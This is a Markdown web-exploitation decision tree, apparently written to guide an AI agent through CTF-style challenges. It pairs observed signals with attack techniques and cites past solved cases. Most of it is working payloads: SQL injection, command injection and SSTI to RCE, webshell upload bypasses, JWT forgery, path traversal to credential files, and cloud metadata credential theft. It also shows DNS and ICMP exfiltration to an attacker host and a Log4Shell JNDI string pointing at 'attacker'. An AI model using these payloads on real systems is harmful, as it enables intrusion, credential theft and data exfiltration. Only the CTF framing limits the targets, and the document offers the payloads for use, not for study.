# Web 漏洞挖掘决策树

> 适用：Web 应用、API、业务系统、供应链场景。真实比赛占 67%，是绝对主力。
> 包括通用 Web 漏洞模式 + A 系列实战蒸馏 + 复杂业务漏洞链 + 供应链。

### Web Applications

The most common winning patterns in web challenges:

**File read primitives** — Once you can read files, you can read source code, configuration, and flags:
- Path traversal: `../../../etc/passwd` — use `curl --path-as-is` to prevent normalization
- LFI in include parameters: `?lang=....//....//....//etc/passwd` (double-dot-slash bypasses naive `str_replace`)
- php://filter (if not WAF-blocked): `php://filter/convert.base64-encode/resource=config`
- SSRF via proxy scripts: `proxy.php?url=file:///etc/passwd`

**Authentication issues** — Default credentials, weak passwords, session manipulation:
- Always try: `admin/admin`, `admin/password`, `admin/123456`, `test/test`
- Decode base64 strings found in JS: `echo 'QURNSU4xMkAxMjMh' | base64 -d`
- Flask session forgery: brute-force SECRET_KEY with common values
- JWT manipulation: `kid` parameter path traversal, algorithm confusion (RS256→HS256)

**Parameter manipulation** — Mass assignment, injection, type confusion:
- Mass assignment: `POST /api/update?id=1 -d "role=admin"` or `receipt_path=/flag`
- Command injection in conversion/preview params: `output_format=pdf;id`, `pdf|id`, `` pdf`id` ``
- SQL injection: `' OR 1=1--`, UNION-based extraction, `LOAD_FILE()`, `INTO OUTFILE`
- XXE: `<!ENTITY xxe SYSTEM "file:///etc/passwd">` (often WAF-blocked — try UTF-16, parameter entities)

**Blind & out-of-band injection** — when the response has NO visible reflection (a-03 lesson: don't give up just because UNION/error-based SQLi is filtered). These techniques take patience but solve the otherwise-impossible cases:

- **Boolean-based blind SQLi**: `id=1 AND SUBSTR((SELECT flag FROM flags),1,1)='a'--` — compare response length / status to a known-true baseline. Automate with `sqlmap --level=5 --risk=3 --technique=B`.
- **Time-based blind SQLi**: `id=1; IF(SUBSTR(@@version,1,1)='5',SLEEP(3),0)--` — measure response latency. `sqlmap --technique=T` does this automatically; for hand-rolling, wrap in a binary-search loop over each character.
- **DNS / OOB exfiltration** (works when the target can make outbound DNS but you can't see responses):
  ```bash
  # Set up a listener first (Burp Collaborator, interactsh, or your own DNS)
  interactsh-client  # generates a *.oast.live domain, prints received queries
  # Then trigger on target:
  # SQLi (MySQL):  SELECT LOAD_FILE(CONCAT('\\\\',(SELECT flag),'.<your>.oast.live\\a'))
  # SSRF:          http://<target>/?url=http://<flag-encoded>.<your>.oast.live
  # XXE:           <!ENTITY x SYSTEM "http://<data>.<your>.oast.live">
  ```
- **ICMP exfil** when DNS is blocked: `ping -c1 -p $(echo -n $flag|xxd -p) <your-ip>`
- **Binary-search template** for any blind oracle (1-char-at-a-time is too slow — bisect instead):
  ```python
  # Extract one secret char per ~7 requests instead of ~95
  lo, hi = 32, 126
  while lo < hi:
      mid = (lo + hi) // 2
      if oracle(f"... WHERE ASCII(SUBSTR(secret,{i},1))>{mid}"): lo = mid + 1
      else: hi = mid
  ```

**Upload bypasses** — Get a webshell:
- Content-Type manipulation: upload `.php` with `Content-Type: image/jpeg`
- Extension tricks: `.phtml`, `.php5`, `.pht`, `.phar`
- Double extension: `shell.php.jpg`

### Web 渗透决策树 — 信号 → 打法（实战蒸馏）

下面每条都是从真实解出的题目里抽出来的"看到 X，就试 Y"对应表。如果你观察到左边的信号，右边的打法已经在本环境里命中过 flag。**按顺序匹配**——靠前的命中率更高。

#### 信号：登录页 / 测试凭据可见

| 观察到 | 立即试 | 命中案例 |
|--------|--------|----------|
| 题面给了凭据（工号/密码），或登录页本身显示测试账号 | 先用它登录，枚举 admin 面板路径（`/admin`、`/admin/flag`、`/dashboard`），再走"角色提升"路线 | a-02：`rootadmin/docpass` 直接进 `/admin/flag` 拿 flag |
| JS 文件里有 base64/混淆字符串 | `grep -oE '[A-Za-z0-9+/]{12,}={0,2}' *.js \| xargs -I{} sh -c 'echo "{}:"; echo {} \| base64 -d'`，找硬编码凭据 | a-17：`/js/login.js` 里 base64 藏了 `admin:ADMIN12@123!` |
| JS 注释里有"临时开放"、"TODO 上线前加鉴权"、"集成测试用" | 把注释里提到的端点名当 ffuf 字典重点，**带凭据 + 不带凭据**各试一遍；注释指向的"临时接口"通常没做权限校验 | a-05：dashboard JS 注释暴露"管理员审批接口临时开放" |
| 前端 JS 里有 `X-API-Key` / `Authorization` 头部构造，或硬编码 token | 直接拿这个 key 访问所有 `/api/*` 端点，绕过 session 鉴权 | a-04：`/assets/js/app.js` 里 `cms_int_svc_k3y_9x2m7q`；a-06：LFI 读出 `settings.py` 里的 service key |

#### 信号：文件读 / 路径穿越 / LFI 原语

一旦拿到任意文件读，**不要只读 `/etc/passwd` 验证**——按这个顺序读，每一步都为下一步铺路：

1. **读源码**：`?file=php://filter/convert.base64-encode/resource=config.php` 拿配置（API key、DB 凭据、隐藏路径）
2. **读 `/proc/self/environ`** 找 `*_PATH`、`*_KEY` 环境变量——flag 路径经常动态拼在环境变量里
3. **读 `/proc/self/mountinfo`** 找 Docker volume 挂载点——flag 经常挂在 `/challenge/flag.txt`，但**真实宿主路径**在 mountinfo 里能看到
4. 读 `/proc/1/cmdline`、`/etc/nginx/nginx.conf`、`/var/www/html/.htaccess` 摸清服务架构

| 观察到 | 立即试 | 命中案例 |
|--------|--------|----------|
| WAF 把 `../` 替换掉 | 用**绝对路径** `/etc/passwd`、`/proc/self/environ`（很多 WAF 只过滤相对穿越）；或 `....//....//`（双点斜绕过单次 `str_replace`）；或 `--path-as-is` 防止 curl 归一化 | a-01：`/api/logs/read` 单次 strip `../`，绝对路径直读 |
| LFI 能读但 `/proc/self/environ` 读不到（libxml2 对 null byte 失败） | 改读 **`/proc/self/mountinfo`**（无 null byte，能列出 flag 文件的真实挂载路径），再用 `php://filter` base64 读那个路径 | a-07：XXE 能读 mountinfo 但读不了 environ，靠 mountinfo 找到 flag 挂载点 |
| `download.php?id=CONTRACT-001.pdf` 这种"按 id 取文件"接口 | 试 `id=../../../../etc/passwd`，**深度要够**（4 层以上 `../` 才出 webroot）；读出源码后看 `file_exists` 逻辑找隐藏 id | a-05：`download.php` 一开始穿不透是因为 `../` 层数不够（3 层仍在 webroot 内） |
| 文件下载接口 + 看不到 flag 文件 | 读源码找"隐藏 contract/订单/配置"——dashboard 不显示但代码里有 `sensitive=true` 标记的条目 | a-05：`config.php` 里有 `id='system-init-config'` 隐藏条目 |

#### 信号：命令注入 / SSTI / 反序列化

| 观察到 | 立即试 | 命中案例 |
|--------|--------|----------|
| 导出/转换功能的 `filename` / `output_format` 参数进了系统命令 | `filename=$(cat /challenge/flag.txt > /var/www/html/uploads/f.txt)`——**把 flag 写到 web 可访问目录**再 curl 取，比 blind RCE 反连稳得多 | a-09：`POST /api.php?action=export` 的 `filename` 参数命令注入 |
| 转换/预览服务接 `input_file=xxx` 之类参数 | `input_file=test.txt;cat /challenge/flag.txt`；带 `X-API-Key` 头（很多内部服务用 header 鉴权而非 session） | a-06：converter 服务 `input_file` 命令注入，需 `X-API-Key` 头 |
| 老旧 OA / CMS 有"模板编辑"、"通知公告 HTML"功能 | **Jinja2 SSTI**：`{{ ''.__class__.__mro__[1].__subclasses__() }}` 找 `os._wrap_close`，再 `os.popen('cat /challenge/flag.txt').read()`；先 SQLi dump users 表拿 admin 凭据进模板后台 | a-11：SQLite UNION SQLi dump admin → 模板编辑 Jinja2 SSTI → RCE |
| PHP 反序列化 + 能控制 `.tpl`/配置文件上传 | (1) 找 `sdk.php`/类定义端点泄漏类结构；(2) 构造 POP 链：`__destruct → __wakeup → warmUp/handle`；(3) WAF 拦 `<?php`/`<?=`/`system`/`exec`？试 **`<? short open tag` + 反引号** `` <?echo `cat /flag`; ?> `` | a-15：`.tpl` 反序列化，WAF 漏了 `<?` 短标签和反引号 |

#### 信号：逻辑漏洞（无技术漏洞时的主战场）

| 观察到 | 立即试 | 命中案例 |
|--------|--------|----------|
| 业务接口接受多个参数，且没有显式白名单 | **Mass assignment**：`POST /api/update_ticket -d "id=1&receipt_path=/challenge/flag.txt"`——加一个代码里没暴露但名字合理的字段 | a-08：报销系统 `receipt_path` 注入指向 flag，下载接口直接吐文件 |
| 电商/秒杀/优惠卷，"每用户限领一张" + 价格 vs 优惠额不匹配 | **不校验金额覆盖**：直接拿小面额优惠卷买高价商品——很多业务只查"有没有卷"不查"卷值 ≥ 商品价" | a-10：84 元卷买 999 元 flag 商品成功 |
| "普通用户只能看自己的数据"，URL 里有 `?id=` / `?user_id=` | **IDOR / 越权**：`id=1`、`id=0`、`id=admin`，横向/纵向遍历；很多系统只检 session 存在，不检资源归属 | a-09：`api.php?action=template&id=1` 任意用户读 admin 私有报表 |

#### 信号：鉴权 / Token 操控

| 观察到 | 立即试 | 命中案例 |
|--------|--------|----------|
| JWT（`eyJ` 开头），header 里有 `kid` 字段 | **kid 路径穿越**：服务器通常 `__DIR__.'/keys/'.$kid`，设 `kid='../css/reset.css'` 就能用任意已知文件内容当 HMAC key 伪造 admin JWT。先读一个 web 可访问的静态文件，用它内容签名 | a-18：`kid='../css/reset.css'`，用 reset.css 内容当 key 伪造 admin JWT |
| PHP 后端 `$_POST['php_code.execute']` 这种带点的参数名 | **PHP 把点转下划线**，正常 POST 拿不到原参数。绕过：用 raw socket / `php://input` + `Content-Type: multipart/form-data` 手写 boundary，或在 variable name 里用 `[` 触发数组解析 | a-18：rule engine 的 `php_code.execute` 参数需要保点 |
| JWT 一直破解不出 | 别死磕 rockyou。先试 alg=none、kid 穿越、`/keys/` 目录列表、RS256→HS256 混淆、jku/x5u 外链；都失败再考虑这条路不通，换别的入口 | a-18：破解失败，靠 kid 穿越破局 |

## 复杂业务漏洞链（真实比赛重点）

> 真实比赛强调"复杂业务漏洞链的理解、关联分析与验证"——不是单点漏洞，而是多个弱点串成攻击链。下面是高频链路模式。

### 链路 1：越权 → 数据泄露 → 提权

最常见的多步链。单步看都是"低危"，组合起来通杀：

```
IDOR 读他人数据 → 发现隐藏 API/凭据 → 用凭据进管理后台 → RCE/flag
```

| 步骤 | 信号 | 动作 |
|------|------|------|
| 入口 | URL 有 `?id=`/`?user_id=`/`?order_id=` | 遍历 id（1,2,3...admin），看能否读他人数据 |
| 扩大 | 响应含 API 端点/内部标识/凭据碎片 | 提取这些信息，探测隐藏端点 |
| 提权 | 发现 admin 接口但需鉴权 | 用泄露的 token/key/session 直接调，或 IDOR 改 role 字段（mass assignment） |
| 终点 | admin 后台有文件管理/模板编辑/命令执行 | 上传 webshell / SSTI / 命令注入拿 flag |

**关键**：每一步泄露的信息都为下一步铺路。拿到一个数据不要只看"有没有 flag"，要看"有没有下一个入口的线索"。

### 链路 2：SSRF → 内网 → 云元数据

```
SSRF 参数 → 访问内网服务 → 拿云凭据 → 横向到其他服务 → flag
```

| 步骤 | 信号 | 动作 |
|------|------|------|
| 入口 | 任何接受 URL 的参数（`?url=`、`?image=`、`?callback=`、webhook 配置） | 试 `file:///etc/passwd`（文件读）、`http://127.0.0.1:port`（内网）、`gopher://`（协议操纵） |
| 内网探测 | SSRF 可达内网 | 扫内网常见端口：Redis(6379)、MySQL(3306)、内部 API(8080/3000)、consul/etcd |
| 云元数据 | 跑在 AWS/阿里云/腾讯云 | `http://169.254.169.254/latest/meta-data/`（AWS）、`http://100.100.100.200/`（阿里云）拿临时凭据 |
| 横向 | 拿到云 AK/SK | 用 cli（awscli/aliyuncli/tccli）列资源、读对象存储、进其他服务 |

### 链路 3：文件上传 → 解析差异 → RCE

```
上传合法后缀 → 服务器多解析器差异 → 执行代码
```

| 技巧 | 场景 |
|------|------|
| `.htaccess` 覆盖 | Apache：上传 `.htaccess` 把 `.jpg` 当 PHP 解析：`AddType application/x-httpd-php .jpg` |
| 多后缀解析 | Nginx+PHP-FPM：`shell.jpg/.php`（cgi.fix_pathinfo=1 时） |
| 内容欺骗 | `Content-Type: image/jpeg` + GIF89a 头 + PHP 内容；绕过 getimagesize 检查 |
| 竞争条件 | 上传后立即被删？边上传边 curl 访问，抢窗口执行 |
| Zip slip / 归档 | 解压功能：构造 zip 内含 `../../var/www/html/shell.php` |

### 链路 4：GraphQL / API 批量查询

| 信号 | 动作 |
|------|------|
| `/graphql` 端点可达 | `{__schema{types{name fields{name type{name}}}}}` 内省全部 schema |
| 内省被禁 | 批量查询爆破：`{user(id:1){email}}` 遍历 id；嵌套查询打 DB |
| Mutation 暴露 | 找 `createAdmin`/`updateRole`/`deleteUser` 等高危 mutation，测鉴权 |

## 供应链漏洞（真实比赛新增方向）

> 真实比赛明确提到"供应链场景"。攻击面不限于目标自身代码，还包括第三方依赖。

### 第三方 JavaScript 供应链

| 信号 | 动作 |
|------|------|
| 页面引用 CDN 上的 JS 库（`cdn.jsdelivr.net`、`unpkg.com`） | 检查库是否过时（含已知 DOM XSS / 原型污染）；查 SRI 完整性是否缺失 |
| 前端构建产物暴露 source map | `.js.map` 还原源码，找 API 密钥、隐藏端点、逻辑漏洞 |
| 引入了 `jQuery < 3.5`（原型污染）、`lodash < 4.17.12` | 原型污染 → 可能触发 XSS 或 RCE（取决于 sink） |

### 后端依赖供应链

| 信号 | 动作 |
|------|------|
| 识别出后端框架（Spring/Django/Express/Flask） | 查该版本 CVE；用 `nuclei -tags cve` 扫 |
| Java 项目 | `lib/` 目录或错误页泄露依赖版本 → 查 Fastjson/Jackson/Log4j（Log4Shell！）/Shiro 反序列化 |
| Python 项目 | `requirements.txt` 泄露 → 查 Jinja2/PyYAML/Pillow 的已知 RCE |
| Node 项目 | `package.json` 泄露 → 查 express-validator/lodash/underscore 原型污染 |

### 典型供应链 CVE 速查

| CVE / 漏洞 | 指纹 | 利用 |
|-----------|------|------|
| Log4Shell (CVE-2021-44228) | 任何 Java + log4j2 < 2.15 | `${jndi:ldap://attacker/a}` 注入到任何被日志记录的字段（UA、表单、header） |
| Fastjson < 1.2.47 | Java + `Content-Type: application/json` + Fastjson | `{"@type":"...","x":{...}}` 反序列化 RCE |
| Spring4Shell (CVE-2022-22965) | Spring + JDK9+ + Tomcat | ClassLoader 操控 → 写 webshell |
| Apache Shiro < 1.2.5 | `rememberMe=deleteMe` cookie | Shiro-550 反序列化（默认 AES key） |
| *详见 `cve-products.md` 的产品决策树* | — | — |

## Web 漏洞验证清单

拿到一个可疑点时，按此清单确认是否真漏洞：

- [ ] **可复现**：同样请求发两次，结果一致（排除随机/缓存假阳性）
- [ ] **有实际影响**：能读到敏感数据 / 执行代码 / 越权操作（不只是报错）
- [ ] **跨边界**：影响其他用户/租户的数据（不是只看到自己的）
- [ ] **不是预期功能**：确认这不是产品故意开放的接口
- [ ] **能拿 flag**：CTF 里最终要落到 flag——如果漏洞利用后仍无 flag，换方向

## Web 解题信号补充（实战蒸馏）

> 以下信号来自真实题目的解题过程。当首轮探索未能突破时，对照此表检查是否有遗漏方向。

### 功能点遍历不够深

| 场景 | 常见遗漏 | 动作 |
|------|---------|------|
| 有登录系统且提供了测试凭据 | 只试了 admin 面板，没遍历普通用户可访问的全部功能点 | 以普通用户身份逐个点击报表生成、资产搜索、数据导出、个人设置等每个功能，对每个输入框尝试特殊字符注入 |
| 系统有"数据同步"、"报表生成"、"导出"等功能 | 只扫了常规 API 路径，没试内部服务交互 | 数据同步功能常含 URL 解析，试 SSRF：`url=http://内网IP:端口`，特别注意 URL 解析差异如 `http://evil@内网IP` |
| 仪表盘有模块化加载 | 只看了前端展示，没试模块参数 | 数据同步模块的内部服务解析常存在配置纰漏，SSRF 读内部 API 的 admin 信息接口 |

### SSRF 突破点

| 信号 | 方向 |
|------|------|
| 任何接受 URL 的参数 | URL 解析差异：`http://0.0.0.0/`、`http://[::]:`、`http://127.1`、`http://0x7f000001` 绕过 localhost 过滤 |
| 内部 API 的 `/admin/info` 类端点 | 通过 SSRF 访问内部 API 的管理接口，常直接返回 flag 或敏感配置 |
| 服务部署在容器环境 | 容器元数据 `http://169.254.169.254/` 获取云凭据，注意不同云厂商 IP 不同 |

### 权限提升路径

| 信号 | 方向 |
|------|------|
| 普通用户能访问管理功能的部分入口 | 越权直接调管理 API：改 URL 中的 `user_id`/`role` 参数，测 IDOR |
| 后台有文件上传但限制了后缀 | 后缀检测不全：试 `.phtml` `.php5` `.phar` `.pht` `.shtml` `.htaccess` 覆盖 |
| 拿到 webshell 后内网不通 | 看网卡信息确认内网网段，扫内网 SSH/HTTP 服务，试产品名相关的默认凭证 |
| 多阶段环境中泛微/致远 OA 系统 | OA 产品名作为 SSH 默认凭证（如 ` Weaver` / `Seeyon` 对应的常见密码），同时 OA 本身有已知 CVE |

## 失败题蒸馏补充

> 以下要点来自真实失败案例，补充首轮探索中容易遗漏的方向。

### Flask / Werkzeug 应用突破

当目标是 Flask/gunicorn/Werkzeug 且所有路由返回 302 重定向到 /login 时：

| 方向 | 操作 |
|------|------|
| Werkzeug Debug Console | 访问 `/console`，如果 DEBUG=True 会暴露交互式 Python debugger，直接 `__import__('os').popen('cat /flag').read()` |
| Secret Key 暴力破解 | Flask session cookie 用 `flask-unsign --unsign --wordlist rockyou.txt` 破解 SECRET_KEY，伪造 admin session |
| Blueprint 隐藏路由 | Flask Blueprint 可能注册在非显而易见的 URL 前缀下，试 `/api/v1/` `/api/v2/` `/internal/` `/debug/` `/health/` `/metrics/` |
| gunicorn 配置泄露 | 读 `/proc/self/environ` 找 `GUNICORN_*` 环境变量；读 `app.py`/`wsgi.py`/`requirements.txt` 找入口和依赖 |
| Jinja2 SSTI 前置 | 即使没有明显的模板编辑功能，任何用户输入反射到响应中的地方都试 `{{7*7}}` 检测 SSTI |
| Python pickle/session 反序列化 | 如果 session 存在文件/Redis 中且可控，构造恶意 pickle payload |

### 企业站 / 通用 CMS 系统化枚举

当目标是一个普通企业网站且无明显漏洞入口时，按此 checklist 逐项排查：

```
1. 后台路径枚举（比 ffuf 更有针对性的路径）
   /admin /admin.php /admin/ /manage /backend /system /dashboard
   /login.php /adminlogin /houtai /guanli（中文拼音后台路径）

2. 功能点深度测试
   搜索框：SQL注入（' UNION SELECT 1,2,3--）、XSS
   新闻/文章详情：id 参数 SQL注入、IDOR
   文件下载：路径穿越（../../../etc/passwd）
   文件上传：所有上传入口逐一测后缀绕过
   留言/评论：XSS、存储型注入

3. 源码泄露
   /.git/config → git-dumper 恢复源码
   /backup.zip /www.zip /web.tar.gz
   /.svn/entries /.hg/store
   /index.php.bak /config.php.bak

4. 中间件/服务器层面
   Nginx 配置不当：/test.jpg.php（cgi.fix_pathinfo）
   PHP-FPM 直接访问：fastcgi 端口或 /status /ping
   配置文件：/proc/self/environ 找应用配置路径
```

### 凭据/入口到手后的二次卡点（a-05/a-14 失败蒸馏）

拿到 admin 凭据或确认入口漏洞 **≠ 能拿 flag**——多 flag 题常在"二次利用"卡住：

| 卡点 | 现象（实战） | 对策 |
|------|-------------|------|
| **凭据到手但功能端点找不到** | a-05：从 config.php LFI 读出 `admin/admin123` 登录成功，但管理审批 API 枚举 923 候选名 + ffuf 5484 词全 404 | (1) 端点可能不在 `api/` 前缀（试 `/admin/`、`/manage/`、`/system/`、`/internal/`）；(2) **LFI 读路由配置**（index.php 的 include/switch、框架路由表）比盲猜快；(3) 检查 JS bundle 硬编码的 API 路径；(4) 试非常规方法 PUT/DELETE + `action=` 参数 |
| **in-app WAF 剥离参数** | a-14：Flask `/api/import` 的 WAF 直接从 body **删 url key**，HTTP/1.0、编码、分块等协议绕过**全穷尽无果** | 应用层 WAF（非网关）协议绕过基本无效。换方向：(1) 找同类未被 WAF 覆盖的端点；(2) 参数名变体（url→URL/Url/source/target）；(3) 找未走 WAF 的直连端口（如 admin-api:5000）；(4) **及早换攻击面，别耗尽预算** |

**心态**：拿到凭据/入口后设**时间盒**（~15min），找不到利用路径就换方向。a-05 在端点枚举上耗尽预算是典型教训——多 flag 题 flag 分散在不同系统，一处卡点不该拖死全局。

### 目标不可达时的排查

当 curl/nc 连不上目标但端口扫描显示 OPEN 时：

```bash
# 1. 验证是否真的不通——不同工具交叉验证
curl -sv --connect-timeout 10 http://<target>/
nc -vz <ip> <port>
python3 -c "import socket; s=socket.socket(); s.settimeout(5); s.connect(('<ip>',<port>)); print('OK')"

# 2. 检查 DNS 解析（可能是 DNS 问题）
nslookup <target> || dig <target>

# 3. 检查路由（容器内可能网络隔离）
ip route
traceroute <target>

# 4. 容器网络模式问题
# 如果 agent 在 Docker 内，--network host 可能未生效
ip addr show  # 确认能看到的网络接口
# 尝试通过不同接口访问
curl --interface eth0 http://<target>/
```

### 拿到任意文件读后的深度利用

拿到 LFI / 路径穿越 / 任意文件读后，**不要只读一次 /etc/passwd 就满足**。按优先级读取：

```
优先级 1 — 应用源码（找隐藏端点、密钥、flag 路径）
  /var/www/html/config.php / .env / settings.py
  /app/config.py / /app/app.py
  /proc/self/cwd/（符号链接到工作目录）

优先级 2 — 环境变量（flag 可能动态拼在 env 里）
  /proc/self/environ
  /proc/1/environ

优先级 3 — 进程信息（找服务架构和额外端口）
  /proc/self/cmdline / /proc/1/cmdline
  /proc/net/tcp（列出所有监听端口，含内部服务）

优先级 4 — 挂载信息（找 Docker volume 里藏的 flag）
  /proc/self/mountinfo
  /etc/fstab

优先级 5 — 系统配置
  /etc/nginx/nginx.conf / /etc/apache2/apache2.conf
  /etc/redis/redis.conf / /etc/mysql/my.cnf
```

